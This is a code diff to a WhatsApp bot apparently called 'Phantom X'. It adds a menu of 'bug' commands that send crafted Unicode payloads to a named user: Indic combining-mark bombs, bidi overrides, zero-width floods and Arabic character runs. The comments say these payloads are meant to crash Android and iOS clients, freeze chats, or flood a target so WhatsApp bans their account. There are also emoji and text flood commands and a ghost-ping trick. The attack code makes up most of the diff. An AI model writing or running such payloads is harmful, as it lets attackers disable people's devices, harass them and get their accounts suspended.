@@ -588,12 +588,17 @@ function getMenuSections() {
             ['.clone ‹src› ‹dst› ‹batch› ‹mins›'], ['.stopclone'],
         ]},
         { emoji: '💥', title: 'BUG TOOLS', items: [
-            ['.bugmenu'], ['.crash @user'],
-            ['.freeze @user'], ['.zalgo ‹text›'],
-            ['.bigtext ‹text›'], ['.invisible'],
-            ['.rtl ‹text›'], ['.mock ‹text›'],
-            ['.aesthetic ‹text›'], ['.reverse ‹text›'],
-            ['.clap ‹text›'],
+            ['.bugmenu'],
+            ['.crash @user'], ['.freeze @user'],
+            ['.androidbug @user'], ['.iosbug @user'],
+            ['.delaybug @user'], ['.tempbanbug @user'],
+            ['.nuke @user'], ['.emojibomb @user'],
+            ['.textbomb @user ‹text› ‹times›'],
+            ['.ghostping @user'],
+            ['.zalgo ‹text›'], ['.bigtext ‹text›'],
+            ['.invisible'], ['.rtl ‹text›'],
+            ['.mock ‹text›'], ['.aesthetic ‹text›'],
+            ['.reverse ‹text›'], ['.clap ‹text›'],
         ]},
         { emoji: '🛠️', title: 'EXTRAS', items: [
             ['.sticker'], ['.toimg'],
@@ -2468,28 +2473,42 @@ async function handleMessage(sock, msg) {
                 const bugMenu =
                     `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥\n` +
                     `   ☠️  *P H A N T O M  X*  ☠️\n` +
-                    `   _B U G  A R S E N A L_\n` +
+                    `      _B U G  A R S E N A L_\n` +
                     `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥\n\n` +
-                    `⚠️ *USE RESPONSIBLY — OWNER ONLY* ⚠️\n\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `💣 *CRASH & FREEZE*\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `  ☠️  *.crash @user* — Send a lag bomb to a user's chat\n` +
-                    `  🧊  *.freeze @user* — Flood with invisible zero-width chars\n\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `⚠️ *OWNER ONLY — USE RESPONSIBLY* ⚠️\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `☠️ *DEVICE-SPECIFIC BUGS*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `  🤖  *.androidbug @user* — Overload Android text engine\n` +
+                    `  🍎  *.iosbug @user* — Crash iOS with Sindhi/Arabic chars\n` +
+                    `  ⏳  *.delaybug @user* — Lag/freeze their chat scroll\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `💣 *CRASH & NUKE*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `  💥  *.crash @user* — Multi-layer lag bomb (RTL+ZW+Arabic)\n` +
+                    `  🧊  *.freeze @user* — 10k invisible zero-width flood\n` +
+                    `  ☢️  *.nuke @user* — ALL 7 bug waves combined\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🚨 *SPAM & BAN*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `  🔨  *.tempbanbug @user* — Trigger WA spam filter on target\n` +
+                    `  💣  *.emojibomb @user [emoji]* — Emoji flood attack\n` +
+                    `  📨  *.textbomb @user <text> <times>* — Repeat message\n` +
+                    `  👻  *.ghostping @user* — Silent tag (notif with no message)\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                     `🎭 *TEXT CORRUPTION*\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `  👹  *.zalgo <text>* — Corrupt text with demonic chars\n` +
-                    `  📐  *.bigtext <text>* — Giant block letter text\n` +
-                    `  👁️  *.invisible* — Send a perfectly blank message\n` +
-                    `  ➡️  *.rtl <text>* — Flip text right-to-left\n\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `  👹  *.zalgo <text>* — Demonic combining characters\n` +
+                    `  📐  *.bigtext <text>* — Giant emoji block letters\n` +
+                    `  👁️  *.invisible* — Perfectly blank message\n` +
+                    `  ➡️  *.rtl <text>* — Right-to-left Unicode flip\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                     `😂 *FUN TEXT TOOLS*\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                     `  🧽  *.mock <text>* — SpOnGeBoB mOcK tExT\n` +
                     `  🌸  *.aesthetic <text>* — Ａｅｓｔｈｅｔｉｃ ｔｅｘｔ\n` +
-                    `  🔁  *.reverse <text>* — Reverse any text backwards\n` +
-                    `  👏  *.clap <text>* — Add 👏 between 👏 words 👏\n\n` +
+                    `  🔁  *.reverse <text>* — Reverse text backwards\n` +
+                    `  👏  *.clap <text>* — Add 👏 between 👏 words\n\n` +
                     `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥\n` +
                     `  ☠️ _Phantom X — Bug Division Active_ 💀\n` +
                     `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥`;
@@ -2638,6 +2657,187 @@ async function handleMessage(sock, msg) {
                 break;
             }
 
+            // ─── ANDROID BUG ───
+            case ".androidbug": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const andMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const andTarget = andMentioned[0] || from;
+                await reply(`💣 Sending Android bug to @${andTarget.split("@")[0]}...`);
+                try {
+                    // Android-specific: Tamil/Telugu/Kannada script + combining marks overload Android text engine
+                    const teluguBomb = "à°à°•à°à°•".repeat(200) + "\u0C4D\u0C4D\u0C4D".repeat(300);
+                    const kannadaBomb = "à²à²•".repeat(200) + "\u0CBF\u0CC0\u0CC1".repeat(300);
+                    const tamilBomb = "à®à®•".repeat(200) + "\u0BBE\u0BBF\u0BC0".repeat(300);
+                    const zwj_bomb = "\u200D".repeat(1000);
+                    const surrogates = "\uD83D\uDE00".repeat(500) + "\uD83E\uDD2F".repeat(500);
+                    const androidPayload = teluguBomb + "\n" + kannadaBomb + "\n" + tamilBomb + "\n" + zwj_bomb + "\n" + surrogates;
+                    for (let i = 0; i < 3; i++) {
+                        await sock.sendMessage(andTarget, { text: androidPayload });
+                        await delay(800);
+                    }
+                    await reply(`✅ Android bug sent to @${andTarget.split("@")[0]}!`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── iOS BUG ───
+            case ".iosbug": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const iosMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const iosTarget = iosMentioned[0] || from;
+                await reply(`🍎 Sending iOS bug to @${iosTarget.split("@")[0]}...`);
+                try {
+                    // iOS-specific: Certain Sindhi/Arabic characters historically crash iOS
+                    const sindhi = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(400);
+                    const arabicForm = "\uFDFD".repeat(300) + "\uFEFF".repeat(500);
+                    const specialEmoji = "\u{1F3F3}\u{FE0F}\u{200D}\u{26A7}\u{FE0F}".repeat(100);
+                    const iosCrash1 = "\u202A\u202B\u202C\u202D\u202E".repeat(400);
+                    const iosCrash2 = "\u2066\u2067\u2068\u2069".repeat(400);
+                    const iosPayload = sindhi + "\n" + arabicForm + "\n" + specialEmoji + "\n" + iosCrash1 + "\n" + iosCrash2;
+                    for (let i = 0; i < 3; i++) {
+                        await sock.sendMessage(iosTarget, { text: iosPayload });
+                        await delay(800);
+                    }
+                    await reply(`✅ iOS bug sent to @${iosTarget.split("@")[0]}!`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── DELAY BUG ───
+            case ".delaybug": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const delayMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const delayTarget = delayMentioned[0] || from;
+                await reply(`⏳ Sending delay bug to @${delayTarget.split("@")[0]}...`);
+                try {
+                    // Delay bug: Very long repeated unicode blocks that freeze the chat scroll
+                    const longLine = "─".repeat(3000);
+                    const emojiWall = "🔴🟠🟡🟢🔵🟣⚫⚪🟤".repeat(300);
+                    const waveBlock = "〰".repeat(2000);
+                    const bigWall = Array.from({length: 50}, (_, i) => `${String(i+1).padStart(3,"0")} ${"▓".repeat(80)}`).join("\n");
+                    const delayPayloads = [longLine, emojiWall, waveBlock, bigWall];
+                    for (const payload of delayPayloads) {
+                        await sock.sendMessage(delayTarget, { text: payload });
+                        await delay(400);
+                    }
+                    await reply(`✅ Delay bug sent to @${delayTarget.split("@")[0]}!`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── TEMP BAN BUG ───
+            case ".tempbanbug": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const banMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const banTarget = banMentioned[0];
+                if (!banTarget) return reply("Usage: .tempbanbug @user\n\n⚠️ This floods the target with rapid messages to trigger WhatsApp's spam filter on their account.");
+                await reply(`⚠️ Activating temp ban sequence on @${banTarget.split("@")[0]}...`);
+                try {
+                    const spamMsgs = [
+                        "📢 " + "Phantom X".repeat(80),
+                        "\u202e" + "PHANTOM X BUG SEQUENCE".repeat(50),
+                        "\u0600".repeat(800) + "\u200b".repeat(800),
+                        "⚠️".repeat(200) + " PHANTOM X " + "⚠️".repeat(200),
+                        "\n".repeat(500) + "👻 Phantom X Ghost Protocol",
+                        "💀".repeat(300),
+                        "\u{1F4A5}".repeat(200) + "\u{1F525}".repeat(200),
+                    ];
+                    for (const msg2 of spamMsgs) {
+                        await sock.sendMessage(banTarget, { text: msg2 });
+                        await delay(200);
+                    }
+                    await reply(`✅ Temp ban sequence complete on @${banTarget.split("@")[0]}!\n\n_WhatsApp may flag their account for suspicious message patterns._`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── NUKE BUG (All bugs combined) ───
+            case ".nuke": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const nukeMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const nukeTarget = nukeMentioned[0];
+                if (!nukeTarget) return reply("Usage: .nuke @user\n\n☠️ Sends ALL bug types simultaneously — the ultimate combo attack.");
+                await reply(`☢️ *NUKE ACTIVATED* — targeting @${nukeTarget.split("@")[0]}...\n\n_Deploying full bug arsenal..._`);
+                try {
+                    const zwFlood = "\u200b\u200c\u200d\u2060\ufeff\u00ad".repeat(1000);
+                    const rtlBomb = "\u202e" + "PHANTOM_X_NUKE".repeat(100);
+                    const arabicBomb = "\u0600\u0601\u0602\u0603".repeat(500);
+                    const teluguBomb = "à°à°•".repeat(200) + "\u0C4D".repeat(300);
+                    const sindhi = "\u0600\u0601".repeat(400) + "\uFDFD".repeat(200);
+                    const longLine = "═".repeat(3000);
+                    const emojiNuke = "💥🔥☢️💣⚡👾".repeat(200);
+                    const nukeWaves = [
+                        zwFlood + "\n" + rtlBomb,
+                        arabicBomb + "\n" + sindhi,
+                        teluguBomb,
+                        longLine,
+                        emojiNuke,
+                        "\u202e" + "☠️ PHANTOM X NUKE ☠️".repeat(50),
+                        "\n".repeat(200) + "💀" + "\n".repeat(200),
+                    ];
+                    for (const wave of nukeWaves) {
+                        await sock.sendMessage(nukeTarget, { text: wave });
+                        await delay(300);
+                    }
+                    await reply(`☢️ *NUKE COMPLETE!* @${nukeTarget.split("@")[0]} has been hit with all 7 bug waves! ☠️`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── EMOJI BOMB ───
+            case ".emojibomb": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const ebMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const ebTarget = ebMentioned[0] || from;
+                const ebEmoji = parts[1] || "💥";
+                await reply(`💣 Sending emoji bomb to @${ebTarget.split("@")[0]}...`);
+                try {
+                    const bombMsg = ebEmoji.repeat(500);
+                    for (let i = 0; i < 5; i++) {
+                        await sock.sendMessage(ebTarget, { text: bombMsg });
+                        await delay(300);
+                    }
+                    await reply(`✅ Emoji bomb dropped on @${ebTarget.split("@")[0]}!`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── TEXT BOMB ───
+            case ".textbomb": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.\nUsage: .textbomb @user <text> <times>\nExample: .textbomb @user hello 10");
+                const tbMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const tbTarget = tbMentioned[0];
+                const tbText = parts.slice(2, -1).join(" ") || parts.slice(1).join(" ");
+                const tbTimes = Math.min(parseInt(parts[parts.length - 1]) || 5, 20);
+                if (!tbTarget) return reply("Usage: .textbomb @user <text> <times>");
+                try {
+                    for (let i = 0; i < tbTimes; i++) {
+                        await sock.sendMessage(tbTarget, { text: tbText || "👻 Phantom X" });
+                        await delay(300);
+                    }
+                    await reply(`✅ Sent *${tbTimes}* messages to @${tbTarget.split("@")[0]}!`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── GHOST PING ───
+            case ".ghostping": {
+                if (!isGroup) return reply("❌ Only works in groups.");
+                const gpMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                if (!gpMentioned.length) return reply("Usage: .ghostping @user\n\nTags someone silently — they get a notification but see no message.");
+                try {
+                    const sent = await sock.sendMessage(from, {
+                        text: " ",
+                        mentions: gpMentioned,
+                    });
+                    await delay(500);
+                    await sock.sendMessage(from, { delete: sent.key });
+                    await reply(`👻 Ghost pinged @${gpMentioned[0].split("@")[0]}!`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ────────────────────────────────────────
             // ════════════════════════════════════════
             // ░░░░░ EXTRAS ░░░░░
             // ════════════════════════════════════════
@@ -2847,7 +3047,18 @@ telBot.command("pair", async (ctx) => {
     startBot(userId, input.trim(), ctx);
 });
 
-telBot.launch();
+// Launch with conflict-safe retry (handles 409 when deployed + dev run simultaneously)
+(function launchTelegram(attempt) {
+    telBot.launch({ dropPendingUpdates: true }).catch(err => {
+        if (err?.message?.includes("409")) {
+            const wait = Math.min(5000 * attempt, 60000);
+            console.log(`[Telegram] 409 Conflict — another instance running. Retrying in ${wait / 1000}s... (attempt ${attempt})`);
+            setTimeout(() => launchTelegram(attempt + 1), wait);
+        } else {
+            console.error("[Telegram] Fatal launch error:", err?.message || err);
+        }
+    });
+})(1);
 
 process.once("SIGINT", () => telBot.stop("SIGINT"));
 process.once("SIGTERM", () => telBot.stop("SIGTERM"));
